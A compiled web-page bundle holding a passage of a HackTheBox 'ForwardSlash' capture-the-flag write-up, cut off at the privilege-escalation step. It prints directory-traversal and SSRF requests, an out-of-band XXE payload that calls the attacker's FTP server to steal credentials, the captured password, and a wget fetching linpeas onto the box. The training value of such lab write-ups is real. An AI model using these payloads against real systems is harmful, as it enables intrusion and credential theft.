"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[9946],{3905:(e,t,n)=>{n.d(t,{Zo:()=>u,kt:()=>m});var r=n(67294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function s(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function i(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},o=Object.keys(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var l=r.createContext({}),p=function(e){var t=r.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):s(s({},t),e)),n},u=function(e){var t=p(e.components);return r.createElement(l.Provider,{value:t},e.children)},c="mdxType",d={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},h=r.forwardRef((function(e,t){var n=e.components,a=e.mdxType,o=e.originalType,l=e.parentName,u=i(e,["components","mdxType","originalType","parentName"]),c=p(n),h=a,m=c["".concat(l,".").concat(h)]||c[h]||d[h]||o;return n?r.createElement(m,s(s({ref:t},u),{},{components:n})):r.createElement(m,s({ref:t},u))}));function m(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var o=n.length,s=new Array(o);s[0]=h;var i={};for(var l in t)hasOwnProperty.call(t,l)&&(i[l]=t[l]);i.originalType=e,i[c]="string"==typeof e?e:a,s[1]=i;for(var p=2;p<o;p++)s[p]=n[p];return r.createElement.apply(null,s)}return r.createElement.apply(null,n)}h.displayName="MDXCreateElement"},38138:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>s,default:()=>d,frontMatter:()=>o,metadata:()=>i,toc:()=>p});var r=n(87462),a=(n(67294),n(3905));const o={layout:"post",title:"ForwardSlash ",lang:"en",categories:["writeups"],tags:["security","writeups","linux","recon","network","pe","exploit","htb","ftp","http","ssrf","xxe","crypto","system"],date:"2020/07/05",thumbnail:"/img/HackTheBox/forwardslash.png",toc:!0},s=void 0,i={unversionedId:"HackTheBox/ForwardSlash/write-up",id:"HackTheBox/ForwardSlash/write-up",title:"ForwardSlash ",description:"\ud83d\udca2 Info",source:"@site/writeups/HackTheBox/ForwardSlash/write-up.md",sourceDirName:"HackTheBox/ForwardSlash",slug:"/HackTheBox/ForwardSlash/write-up",permalink:"/writeups/HackTheBox/ForwardSlash/write-up",draft:!1,tags:[{label:"security",permalink:"/writeups/tags/security"},{label:"writeups",permalink:"/writeups/tags/writeups"},{label:"linux",permalink:"/writeups/tags/linux"},{label:"recon",permalink:"/writeups/tags/recon"},{label:"network",permalink:"/writeups/tags/network"},{label:"pe",permalink:"/writeups/tags/pe"},{label:"exploit",permalink:"/writeups/tags/exploit"},{label:"htb",permalink:"/writeups/tags/htb"},{label:"ftp",permalink:"/writeups/tags/ftp"},{label:"http",permalink:"/writeups/tags/http"},{label:"ssrf",permalink:"/writeups/tags/ssrf"},{label:"xxe",permalink:"/writeups/tags/xxe"},{label:"crypto",permalink:"/writeups/tags/crypto"},{label:"system",permalink:"/writeups/tags/system"}],version:"current",frontMatter:{layout:"post",title:"ForwardSlash ",lang:"en",categories:["writeups"],tags:["security","writeups","linux","recon","network","pe","exploit","htb","ftp","http","ssrf","xxe","crypto","system"],date:"2020/07/05",thumbnail:"/img/HackTheBox/forwardslash.png",toc:!0},sidebar:"tutorialSidebar",previous:{title:"Fatty ",permalink:"/writeups/HackTheBox/Fatty/write-up"},next:{title:"Jewel ",permalink:"/writeups/HackTheBox/Jewel/write-up"}},l={},p=[{value:"\ud83d\udca2 Info",id:"-info",level:2},{value:"Overview",id:"overview",level:3},{value:"Network Enumeration",id:"network-enumeration",level:3},{value:"HTTP discovery",id:"http-discovery",level:3},{value:"HTTP enumeration",id:"http-enumeration",level:3},{value:"HTTP exploitation: file disclosure &amp; directory traversal",id:"http-exploitation-file-disclosure--directory-traversal",level:3},{value:"HTTP exploitation: SSRF",id:"http-exploitation-ssrf",level:3},{value:"HTTP exploitation: XXE",id:"http-exploitation-xxe",level:3},{value:"Network exploitation: credential stuffing",id:"network-exploitation-credential-stuffing",level:3},{value:"System enumeration",id:"system-enumeration",level:3},{value:"Privilege Escalation : from chiv to pain",id:"privilege-escalation--from-chiv-to-pain",level:3},{value:"Decrypting the ciphertext",id:"decrypting-the-ciphertext",level:3},{value:"Privilege Escalation : from pain to root",id:"privilege-escalation--from-pain-to-root",level:3}],u={toc:p},c="wrapper";function d(e){let{components:t,...o}=e;return(0,a.kt)(c,(0,r.Z)({},u,o,{components:t,mdxType:"MDXLayout"}),(0,a.kt)("h2",{id:"-info"},"\ud83d\udca2 Info"),(0,a.kt)("h1",{id:""}),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Name:")," ForwardSlash"),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Profile:")," ",(0,a.kt)("a",{parentName:"li",href:"https://www.hackthebox.eu/home/machines/profile/239"},"www.hackthebox.eu")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Difficulty:")," Hard"),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"OS:")," Linux"),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Points:")," 40")),(0,a.kt)("p",null,(0,a.kt)("img",{alt:"forwardslash",src:n(72749).Z,width:"598",height:"381"})),(0,a.kt)("h1",{id:"-1"}),(0,a.kt)("h3",{id:"overview"},"Overview"),(0,a.kt)("p",null,(0,a.kt)("strong",{parentName:"p"},"TL;DR"),": There is a web application with a parameter vulnerable to file\ndisclosure, directory traversal and SSRF (not LFI/RFI). Then we can exploit\nan OOB XXE over FTP to steal FTP credentials. Then with credential stuffing\nwe land on the box via SSH. On the system we exploit a SUID binary to read\na configuration file that leaks a database password. With credential stuffing\nagain we can elevate to a more powerful user via SSH. Then we have to break\na custom crypto algorithm to decrypt a ciphertext. The decrypted cyphertext\ngives the password of a LUKS container. Then we can mount the container\nwith sudo permissions and get the root SSH private key."),(0,a.kt)("p",null,"Install tools used in this WU on BlackArch Linux:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ sudo pacman -S nmap   ffuf curl burpsuite xxeserv peass haiti openssh\n")),(0,a.kt)("h3",{id:"network-enumeration"},"Network Enumeration"),(0,a.kt)("p",null,"Let's start by scanning port and services with ",(0,a.kt)("a",{parentName:"p",href:"https://nmap.org/"},"nmap"),":"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"# Nmap 7.80 scan initiated Fri Jun 12 13:17:07 2020 as: nmap -sSVC -p- -oA nmap_full 10.10.10.183\nNmap scan report for 10.10.10.183\nHost is up (0.022s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 3c:3b:eb:54:96:81:1d:da:d7:96:c7:0f:b4:7e:e1:cf (RSA)\n|   256 f6:b3:5f:a2:59:e3:1e:57:35:36:c3:fe:5e:3d:1f:66 (ECDSA)\n|_  256 1b:de:b8:07:35:e8:18:2c:19:d8:cc:dd:77:9c:f2:5e (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Did not follow redirect to http://forwardslash.htb\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Fri Jun 12 13:17:36 2020 -- 1 IP address (1 host up) scanned in 29.63 seconds\n")),(0,a.kt)("p",null,"If we try to reach ",(0,a.kt)("a",{parentName:"p",href:"http://10.10.10.183"},"http://10.10.10.183"),", we are redirected to ",(0,a.kt)("a",{parentName:"p",href:"http://forwardslash.htb"},"http://forwardslash.htb")),(0,a.kt)("p",null,"So let's edit ",(0,a.kt)("inlineCode",{parentName:"p"},"/etc/hosts")," to add this entry:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"10.10.10.183 forwardslash.htb\n")),(0,a.kt)("h3",{id:"http-discovery"},"HTTP discovery"),(0,a.kt)("p",null,"Let's see what we have at ",(0,a.kt)("a",{parentName:"p",href:"http://forwardslash.htb/"},"http://forwardslash.htb/")),(0,a.kt)("p",null,(0,a.kt)("img",{parentName:"p",src:"https://i.imgur.com/hf4e4P1.png",alt:null})),(0,a.kt)("p",null,"So the site was defaced. The defacer is talking about XML so there must be a XXE\nand is also talking about ",(0,a.kt)("em",{parentName:"p"},"Automatic FTP Logins"),"."),(0,a.kt)("h3",{id:"http-enumeration"},"HTTP enumeration"),(0,a.kt)("p",null,"Let's find if there are files hidden somewhere with ",(0,a.kt)("a",{parentName:"p",href:"https://github.com/ffuf/ffuf"},"ffuf"),":"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ ffuf -u http://forwardslash.htb/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -fc 403 -e .txt\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v1.1.0-git\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://forwardslash.htb/FUZZ\n :: Wordlist         : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt\n :: Extensions       : .txt\n :: Follow redirects : true\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403\n :: Filter           : Response status: 403\n________________________________________________\n\n.                       [Status: 200, Size: 1695, Words: 207, Lines: 42]\nnote.txt                [Status: 200, Size: 216, Words: 39, Lines: 5]\n:: Progress: [76534/76534]\xa0:: Job [1/1] :: 1700 req/sec :: Duration: [0:00:45] :: Errors: 0 ::\n")),(0,a.kt)("p",null,"There is one:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'$ curl http://forwardslash.htb/note.txt\nPain, we were hacked by some skids that call themselves the "Backslash Gang"... I know... That name...\nAnyway I am just leaving this note here to say that we still have that backup site so we should be fine.\n\n-chiv\n')),(0,a.kt)("p",null,"So if there is a backup site it may be online too. Let's find it by bruteforcing virtual hosts with subdomains:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ ffuf -u http://10.10.10.183/ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -H 'Host: FUZZ.forwardslash.htb' -fs 1695\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v1.1.0-git\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.10.183/\n :: Wordlist         : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt\n :: Header           : Host: FUZZ.forwardslash.htb\n :: Follow redirects : true\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403\n :: Filter           : Response size: 1695\n________________________________________________\n\nbackup                  [Status: 200, Size: 1267, Words: 336, Lines: 40]\n:: Progress: [38267/38267]\xa0:: Job [1/1] :: 708 req/sec :: Duration: [0:00:54] :: Errors: 0 ::\n")),(0,a.kt)("p",null,"So let's add ",(0,a.kt)("inlineCode",{parentName:"p"},"backup.forwardslash.htb")," to ",(0,a.kt)("inlineCode",{parentName:"p"},"/etc/hosts")," too."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"10.10.10.183 backup.forwardslash.htb\n")),(0,a.kt)("p",null,"We are redirected to ",(0,a.kt)("a",{parentName:"p",href:"http://backup.forwardslash.htb/login.php"},"http://backup.forwardslash.htb/login.php")),(0,a.kt)("p",null,(0,a.kt)("img",{parentName:"p",src:"https://i.imgur.com/CeaCDud.png",alt:null})),(0,a.kt)("p",null,"There is a login form. We can use the registration page to sign up."),(0,a.kt)("p",null,"If we sign up and log in, we are redirected to ",(0,a.kt)("a",{parentName:"p",href:"http://backup.forwardslash.htb/welcome.php"},"http://backup.forwardslash.htb/welcome.php")),(0,a.kt)("p",null,(0,a.kt)("img",{parentName:"p",src:"https://i.imgur.com/rYwZzEG.png",alt:null})),(0,a.kt)("h3",{id:"http-exploitation-file-disclosure--directory-traversal"},"HTTP exploitation: file disclosure & directory traversal"),(0,a.kt)("p",null,"The ",(0,a.kt)("em",{parentName:"p"},"Change your Profile Picture!")," feature is disabled."),(0,a.kt)("p",null,(0,a.kt)("img",{parentName:"p",src:"https://i.imgur.com/2vcUOGm.png",alt:null})),(0,a.kt)("p",null,"But that's just from the HTML so let's edit the DOM, remove the ",(0,a.kt)("inlineCode",{parentName:"p"},"disabled"),"\nattributes and send a request:"),(0,a.kt)("p",null,(0,a.kt)("img",{parentName:"p",src:"https://i.imgur.com/qd8GXZj.png",alt:null})),(0,a.kt)("p",null,"By doing a directory traversal on ",(0,a.kt)("inlineCode",{parentName:"p"},"/etc/passwd")," we obtained a file disclosure:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"POST /profilepicture.php HTTP/1.1\nHost: backup.forwardslash.htb\n...\nCookie: PHPSESSID=mbmjmv76c2veso4c1ihneuh5bt\n\nurl=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin\nsyslog:x:102:106::/home/syslog:/usr/sbin/nologin\nmessagebus:x:103:107::/nonexistent:/usr/sbin/nologin\n_apt:x:104:65534::/nonexistent:/usr/sbin/nologin\nlxd:x:105:65534::/var/lib/lxd/:/bin/false\nuuidd:x:106:110::/run/uuidd:/usr/sbin/nologin\ndnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\nlandscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin\npollinate:x:109:1::/var/cache/pollinate:/bin/false\nsshd:x:110:65534::/run/sshd:/usr/sbin/nologin\npain:x:1000:1000:pain:/home/pain:/bin/bash\nchiv:x:1001:1001:Chivato,,,:/home/chiv:/bin/bash\nmysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false\n")),(0,a.kt)("h3",{id:"http-exploitation-ssrf"},"HTTP exploitation: SSRF"),(0,a.kt)("p",null,"We can also see if there are any other pages:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ ffuf -u http://backup.forwardslash.htb/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -e .txt,.php -fs 288\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v1.1.0-git\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://backup.forwardslash.htb/FUZZ\n :: Wordlist         : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt\n :: Extensions       : .txt .php\n :: Follow redirects : true\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403\n :: Filter           : Response size: 288\n________________________________________________\n\nlogin.php               [Status: 200, Size: 1267, Words: 336, Lines: 40]\nregister.php            [Status: 200, Size: 1490, Words: 426, Lines: 42]\nindex.php               [Status: 200, Size: 1267, Words: 336, Lines: 40]\nlogout.php              [Status: 200, Size: 1267, Words: 336, Lines: 40]\nconfig.php              [Status: 200, Size: 0, Words: 1, Lines: 1]\napi.php                 [Status: 200, Size: 127, Words: 22, Lines: 2]\ndev                     [Status: 403, Size: 65, Words: 6, Lines: 1]\n.                       [Status: 200, Size: 1267, Words: 336, Lines: 40]\nwelcome.php             [Status: 200, Size: 1267, Words: 336, Lines: 40]\nenvironment.php         [Status: 200, Size: 1267, Words: 336, Lines: 40]\nreset-password.php      [Status: 200, Size: 1267, Words: 336, Lines: 40]\nhof.php                 [Status: 200, Size: 1267, Words: 336, Lines: 40]\n:: Progress: [114801/114801]\xa0:: Job [1/1] :: 1881 req/sec :: Duration: [0:01:01] :: Errors: 0 ::\n")),(0,a.kt)("p",null,"It seems there is a dev endpoint that dives us a HTTP 403.\nBut even authenticated we can't access ",(0,a.kt)("a",{parentName:"p",href:"http://backup.forwardslash.htb/dev/"},"http://backup.forwardslash.htb/dev/")),(0,a.kt)("p",null,(0,a.kt)("img",{parentName:"p",src:"https://i.imgur.com/jiVM1Ij.png",alt:null})),(0,a.kt)("p",null,"Hopefully the ",(0,a.kt)("inlineCode",{parentName:"p"},"url")," parameter is not only vulnerable to file disclosure and path\ntraversal but also to SSRF (Server Side Request Forgery).\nMaybe locally this will be allowed, so let's try teh following request in ",(0,a.kt)("a",{parentName:"p",href:"https://portswigger.net/burp"},"burp"),":"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"POST /profilepicture.php HTTP/1.1\nHost: backup.forwardslash.htb\n...\nCookie: PHPSESSID=mbmjmv76c2veso4c1ihneuh5bt\n\nurl=http://backup.forwardslash.htb/dev/\n")),(0,a.kt)("p",null,"Yes! We obtained the HTML code of the dev endpoint:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<html>\n    <h1>XML Api Test</h1>\n    <h3>This is our api test for when our new website gets refurbished</h3>\n    <form action="/dev/index.php" method="get" id="xmltest">\n        <textarea name="xml" form="xmltest" rows="20" cols="50"><api>\n    <request>test</request>\n</api>\n</textarea>\n        <input type="submit">\n    </form>\n\n</html>\n\n\x3c!-- TODO:\nFix FTP Login\n--\x3e\n')),(0,a.kt)("p",null,"It's talking about XML and FTP login as said in the deface."),(0,a.kt)("p",null,"Let's try to send a default request to the XML api:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"POST /profilepicture.php HTTP/1.1\nHost: backup.forwardslash.htb\n...\nCookie: PHPSESSID=mbmjmv76c2veso4c1ihneuh5bt\n\nurl=http://backup.forwardslash.htb/dev/index.php?xml=<cyfun></cyfun>\n")),(0,a.kt)("p",null,"Nothing fancy yet."),(0,a.kt)("h3",{id:"http-exploitation-xxe"},"HTTP exploitation: XXE"),(0,a.kt)("p",null,"We noticed in the HTML code the following structure:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-xml"},"<api>\n    <request>test</request>\n</api>\n")),(0,a.kt)("p",null,"So let's try to forge a simple XXE payload using it:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-xml"},'<?xml version="1.0" ?>\n<!DOCTYPE replace [<!ENTITY xxe "cyfun">]>\n<api>\n  <request>&xxe;</request>\n</api>\n')),(0,a.kt)("p",null,"So I tried to send something like that:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'url=http://backup.forwardslash.htb/dev/index.php?xml%3d<?xml%20version%3d"1.0"%20?><!DOCTYPE%20replace%20[<!ENTITY%20xxe%20"cyfun">]><api>%20%20<request>%26xxe;</request></api>\n')),(0,a.kt)("p",null,"But this doesn't work. But let's remember the FTP hint!"),(0,a.kt)("p",null,"Maybe the XXE is OOB (Out Of Band) only. In general, working with FTP for OOB is far better\nthan HTTP as it wil allows us to retrieve the whole file rather than the 1st line.\nHere I don't think we will retrieve files but rather credentials as it's said there\nis a FTP autologin feature. So we won't need a complex payload:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-xml"},'<?xml version="1.0" ?>\n<!DOCTYPE root [\n<!ENTITY % ext SYSTEM "ftp://10.10.15.32/"> %ext;\n]>\n<api>\n  <request>\n    dontcare\n  </request>\n</api>\n')),(0,a.kt)("p",null,"Our payload will look like this:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'url=http://backup.forwardslash.htb/dev/index.php?xml%3d<%3fxml%2520version%253d"1.0"%2520%3f><!DOCTYPE%2520root%2520[<!ENTITY%2520%25%2520ext%2520SYSTEM%2520"ftp%3a//10.10.15.32/">%2520%25ext%3b]><api><request>dontcare</request></api>\n')),(0,a.kt)("p",null,"PS: even if ",(0,a.kt)("a",{parentName:"p",href:"https://portswigger.net/burp"},"burp")," automatically URL encode key character for us we need to double\nencore the key character in the xml payload for the request to work."),(0,a.kt)("p",null,"But before let's start ",(0,a.kt)("a",{parentName:"p",href:"https://github.com/staaldraad/xxeserv"},"xxeserv"),", a fake FTP server, then, when submitting the request we\nwill receive the credentials:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ sudo xxeserv -p 21\n[*] UNO Listening...\n2020/07/05 19:32:51 [*] GO XXE FTP Server - Port:  21\n2020/07/05 19:32:55 [*] Connection Accepted from [10.10.10.183:50146]\nUSER:  chiv\nPASS:  N0bodyL1kesBack/\n2020/07/05 19:32:55 [x] Connection Closed\n2020/07/05 19:32:55 [*] Closing FTP Connection\n")),(0,a.kt)("p",null,"Two important things were required here:"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"running the FTP server on port 21 (eg. port 2121 was filtered)"),(0,a.kt)("li",{parentName:"ul"},"adding a leading slash to the request (eg. ",(0,a.kt)("inlineCode",{parentName:"li"},"ftp://10.10.15.32/")," works but ",(0,a.kt)("inlineCode",{parentName:"li"},"ftp://10.10.15.32")," not)")),(0,a.kt)("h3",{id:"network-exploitation-credential-stuffing"},"Network exploitation: credential stuffing"),(0,a.kt)("p",null,"Let's see if we can re-use the FTP credentials on SSH:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ ssh chiv@forwardslash.htb\nThe authenticity of host 'forwardslash.htb (10.10.10.183)' can't be established.\nECDSA key fingerprint is SHA256:7DrtoyB3GmTDLmPm01m7dHeoaPjA7+ixb3GDFhGn0HM.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added 'forwardslash.htb,10.10.10.183' (ECDSA) to the list of known hosts.\nchiv@forwardslash.htb's password:\nWelcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Sun Jul  5 17:42:11 UTC 2020\n\n  System load:  0.0                Processes:            196\n  Usage of /:   30.8% of 19.56GB   Users logged in:      0\n  Memory usage: 19%                IP address for ens33: 10.10.10.183\n  Swap usage:   0%\n\n\n * Canonical Livepatch is available for installation.\n   - Reduce system reboots and improve kernel security. Activate at:\n     https://ubuntu.com/livepatch\n\n16 packages can be updated.\n0 updates are security updates.\n\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\n\nLast login: Sun Jul  5 15:11:43 2020 from 10.10.14.230\nchiv@forwardslash:~$\n")),(0,a.kt)("h3",{id:"system-enumeration"},"System enumeration"),(0,a.kt)("p",null,"Let's see what is inside ",(0,a.kt)("inlineCode",{parentName:"p"},"/var/backups/"),":"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"chiv@forwardslash:~$ ls -lhA /var/backups/\ntotal 804K\n-rw-r--r-- 1 root root            60K Mar 24 06:25 alternatives.tar.0\n-rw-r--r-- 1 root root            38K Mar 24 06:17 apt.extended_states.0\n-rw-r--r-- 1 root root           4.1K Mar  6 14:17 apt.extended_states.1.gz\n-rw-r--r-- 1 root root           3.9K Mar  5 14:46 apt.extended_states.2.gz\n-rw------- 1 pain pain            526 Jun 21  2019 config.php.bak\n-rw-r--r-- 1 root root            437 Mar  5 14:07 dpkg.diversions.0\n-rw-r--r-- 1 root root            207 Mar  5 14:47 dpkg.statoverride.0\n-rw-r--r-- 1 root root           653K Mar 24 06:17 dpkg.status.0\n-rw------- 1 root root            730 Mar 17 20:13 group.bak\n-rw------- 1 root shadow          604 Mar 17 20:13 gshadow.bak\n-r--r--r-- 1 root root            129 May 27  2019 note.txt\n-rw------- 1 root root           1.7K Mar  5 14:46 passwd.bak\ndrwxrwx--- 2 root backupoperator 4.0K May 27  2019 recovery\n-rw------- 1 root shadow         1.2K Mar  6 14:21 shadow.bak\n")),(0,a.kt)("p",null,"There are:"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("inlineCode",{parentName:"li"},"config.php.bak")," owned by pain"),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("inlineCode",{parentName:"li"},"note.txt")," which is world readable"),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("inlineCode",{parentName:"li"},"recovery")," folder owned by the ",(0,a.kt)("inlineCode",{parentName:"li"},"backupoperator")," group")),(0,a.kt)("p",null,"The only thing we can read for now is ",(0,a.kt)("inlineCode",{parentName:"p"},"note.txt"),":"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"Chiv, this is the backup of the old config, the one with the password we need to actually keep safe. Please DO NOT TOUCH.\n\n-Pain\n")),(0,a.kt)("p",null,"Let's try to enumerate more with the help of linPEAS (from ",(0,a.kt)("a",{parentName:"p",href:"https://github.com/carlospolop/PEASS-ng"},"PEASS"),")."),(0,a.kt)("p",null,"We have ",(0,a.kt)("inlineCode",{parentName:"p"},"/usr/share/peass/linPEAS/linpeas.sh"),", let's just serve it via HTTP:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ ruby -run -e httpd /usr/share/peass/linPEAS/ -p 8888\n[2020-07-05 20:13:39] INFO  WEBrick 1.6.0\n[2020-07-05 20:13:39] INFO  ruby 2.7.1 (2020-03-31) [x86_64-linux]\n[2020-07-05 20:13:39] INFO  WEBrick::HTTPServer#start: pid=117003 port=8888\n")),(0,a.kt)("p",null,"Now let's download it on the box:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"chiv@forwardslash:/tmp/cyfun$ wget http://10.10.15.32:8888/linpeas.sh\nchiv@forwardslash:/tmp/cyfun$ chmod u+x linpeas.sh\n")),(0,a.kt)("p",null,"In the SUID section we can see an unusual ",(0,a.kt)("inlineCode",{parentName:"p"},"/usr/bin/backup"),"."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"chiv@forwardslash:~$ ls -lh /usr/bin/backup\n-r-sr-xr-x 1 pain pain 14K Mar  6 10:06 /usr/bin/backup\n")),(0,a.kt)("h3",{id:"privilege-escalation--from-chiv-to-pain"},"Privilege Escalation : from chiv to pain"),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"backup")," is owned by 